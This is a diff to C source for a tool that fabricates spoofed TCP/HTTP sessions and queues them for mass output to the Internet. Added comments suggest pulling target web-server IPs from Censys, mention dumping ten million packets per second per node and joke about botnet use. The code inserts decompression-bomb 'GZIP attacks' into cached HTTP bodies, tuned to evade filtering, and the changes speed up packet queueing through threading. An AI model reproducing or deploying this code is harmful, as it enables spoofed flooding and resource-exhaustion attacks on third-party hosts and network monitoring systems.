@@ -23,6 +23,13 @@ It doesn't seem like bandwidth will be a limiting factor here...
 
 */
 /*
+If you'd like too knnow where to find web server IP addresses then check out censys.  You can get all IPs of HTTP, SSL, etc and even Alexa top 1m.
+It would make it a lot simpler than having to check if hosts are up, or down from each node.  It will however increase the original size of the
+application's data.  If you are preparing to dump 10million packets per second to the Internet from each node per half minute, then you probably
+don't care about the initialization data.. unless this is for a botnet.
+
+*/
+/*
 
 Some notes for ISPs:
 If you have an ISP which you think the NSA might be somewhere within your network then you could easily perform tasks like this automated
@@ -380,14 +387,16 @@ pthread_t network_thread;
 
 // another thread for dumping from queue to the network
 void *thread_network_flush(void *arg) {
+    int count = 0;
     while (1) {
         pthread_mutex_lock(&network_queue_mutex);
 
-        FlushAttackOutgoingQueueToNetwork();
+        count = FlushAttackOutgoingQueueToNetwork();
         
         pthread_mutex_unlock(&network_queue_mutex);
 
-        usleep(200);
+        if (!count)
+            usleep(200);
     }
 }
 
@@ -473,6 +482,38 @@ int FlushAttackOutgoingQueueToNetwork() {
 }
 
 
+int AttackQueueAdd(AttackOutgoingQueue *optr, int only_try) {
+    int i = 0;
+
+    if (only_try) {
+        if (pthread_mutex_trylock(&network_queue_mutex) != 0)
+            return 0;
+    } else {
+        pthread_mutex_lock(&network_queue_mutex);
+    }
+    
+    if (network_queue == NULL) {
+        network_queue = network_queue_last = optr;
+    } else {
+        if (network_queue_last != NULL) {
+            network_queue_last->next = optr;
+            network_queue_last = optr;
+        }
+    }
+
+    pthread_mutex_unlock(&network_queue_mutex);
+
+    return 1;
+}
+
+void *AS_queue_threaded(void *arg) {
+    AttackOutgoingQueue *optr = (AttackOutgoingQueue *)arg;
+
+    AttackQueueAdd(optr, 0);
+
+    pthread_exit(NULL);
+}
+
 // It will move a packet from its PacketInfo (from low level network packet builder) into the
 // over all attack structure queue going to the Internet.
 int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
@@ -498,22 +539,14 @@ int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
     // Just in case some function later (during flush) will want to know which attack the buffer was generated for
     optr->attack_info = attack;
 
-    //pthread_mutex_lock(&network_queue_mutex);
-
-    // Put into the linked list using a small optimization of keeping information regarding the last
-    // structure that was appended.. It allows us to quickly add another entry.  
-    if (network_queue == NULL) {
-        network_queue = network_queue_last = optr;
-    } else {
-        if (network_queue_last != NULL) {
-            network_queue_last->next = optr;
-            network_queue_last = optr;
-        } else {
-            //L_link_ordered((LINK **)network_queue, (LINK *)optr);
+    // if we try to lock mutex to add the newest queue.. and it fails.. lets try to pthread off..
+    if (AttackQueueAdd(optr, 1) == 0) {
+        // create a thread to add it to the network outgoing queue.. (brings it from 4minutes to 1minute) using a pthreaded outgoing flusher
+        if (pthread_create(&optr->thread, NULL, AS_queue_threaded, (void *)optr) != 0) {
+            // if we for some reason cannot pthread (prob memory).. lets do it w waiting
+            AttackQueueAdd(optr, 0);
         }
     }
-
-    //pthread_mutex_unlock(&network_queue_mutex);
 
     return 1;
 }
@@ -1375,6 +1408,9 @@ int GenerateTCPSendDataInstructions(ConnectionProperties *cptr, PacketBuildInstr
     while (data_size > 0) {
         packet_size = min(data_size, from_client ? cptr->max_packet_size_client : cptr->max_packet_size_server);
 
+        // if something wasn't handled properly.. (when i turned off OSPick().. i had to search for hours to find this =/)
+        if (packet_size < 0) return -1;
+
         //printf("pkpt size %d data %d from cl %d max cl %d max serv %d\n", packet_size, data_size, from_client, cptr->max_packet_size_client, cptr->max_packet_size_server);
         // the client sends its request... split into packets..
         packet_flags = TCP_FLAG_PSH|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
@@ -1651,9 +1687,9 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     //OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
     //OsPick(OS_LINUX,  &cptr.server_ttl, &cptr.max_packet_size_server);
 
+    // if these are not set properly.. itll cause issues during low level packet building (TCPSend-ish api)
     cptr.client_ttl = 64;
     cptr.server_ttl = 53;
-
     cptr.max_packet_size_client = max_packet_size_client;
     cptr.max_packet_size_server = max_packet_size_server;
 
@@ -1732,10 +1768,10 @@ void gzip_init() {
 
 // This function will perform a GZIP Attack on a body.  I wrote it to take a previously compressed HTTP result, decompress it,
 // insert attacks, recompress it, replace the original, and to cache it for future use.  The caching will reuse the same
-// packet for 15 times before retiring it.  
+// packet for X times before retiring it.  
 // If you consider generating thousands of connections every second, then it would be pretty tough for platforms to create
-// seekers to find 15 similar GZIP responses from packets that have different source ports/ips/ &destinations.  I wouldn't
-// believe that reusing a GZIP attack for 15 sessions will merrit any decent way of filtering.
+// seekers to find similar GZIP responses from packets that have different source ports/ips/ &destinations.  I wouldn't
+// believe that reusing a GZIP attack for Y sessions will merrit any decent way of filtering.
 // The parameters are attack size, and how many insertions.  The insertions is a rand()%"how many" operation  which would be the maximum
 // amount of injections between 1 and that value.  The size will take random characters within the plain text data, mark them, and whenever
 // compressing that character it would repeat those specific characters a million times.  It will create an extra megabyte of information
@@ -2185,16 +2221,24 @@ void *HTTP_Create(AS_attacks *aptr) {
     if (aptr->extra_attack_parameters == NULL) {
         eptr = (HTTPExtraAttackParameters *)calloc(1, sizeof(HTTPExtraAttackParameters));
         if (eptr != NULL) {
+            // parameters for gzip attack...
             // enable gzip attacks
             eptr->gzip_attack = 1;
+
             // percentage of sessions to perform gzip attacks on
             eptr->gzip_percentage = 10;
-            // size of the gzip injections (100 megabytes here)
+
+            // size of the gzip injection at each location it decides to insert the attack at
             eptr->gzip_size = 1024*1024 * 1;
-            // between 1-5 injections
+            
+            // how many injections of a GZIP attack? this is the upper range fromm 1 to this number..
+            // be careful.. the amount here will exponentially increase memory usage..
+            // during testing without writing to network wire.. it fills up RAM fast (waiting for pcap dumping)
             eptr->gzip_injection_rand = 5;
+
             // how many times to reuse the same cache before creating a new one?
-            eptr->gzip_cache_count = 1500;
+            // the main variations here are between 1-100 i think.. with pthreads
+            eptr->gzip_cache_count = 5000;
 
             // attach the extra attack parameters to this session
             aptr->extra_attack_parameters = eptr;
@@ -2366,6 +2410,7 @@ int main(int argc, char *argv[]) {
     int count = 1;
     int repeat_interval = 1;
     int i = 0, r = 0;
+    int start_ts = time(0);
     FILE *fd;
 #ifdef BIG_TEST
     int repeat = 1000000;
@@ -2456,7 +2501,7 @@ int main(int argc, char *argv[]) {
         }
     }
     
-    printf("\rDone\t\t\n");
+    printf("\rDone                      \t\t\n");
 #endif
 
 #ifndef BIG_TEST
@@ -2468,7 +2513,7 @@ int main(int argc, char *argv[]) {
         printf("AS_perform() = %d\n", r);
     }
 #endif
-
+3;
     // how many packes are queued in the output supposed to go to the internet?
     printf("network queue: %p\n", network_queue);
     if (network_queue)
@@ -2476,8 +2521,14 @@ int main(int argc, char *argv[]) {
 
 
     printf("Gzip Count: %d\n", total_gzip_count);
+
+    // This is probably the amount of time it'd dumping to network since its all happening simultaneously
+    printf("Time before dumping packets to disk: %d seconds\n", (int)(time(0) - start_ts));
+
     // now lets write to pcap file.. all of those packets.. open up wireshark.
     dump_pcap((char *)"output.pcap", network_queue);
+
+    printf("Time to fabricate, and dump packets to disk: %d seconds\n", (int)(time(0) - start_ts));
 
     //printf("sleeping.. check ram usage\n");
     //sleep(300);
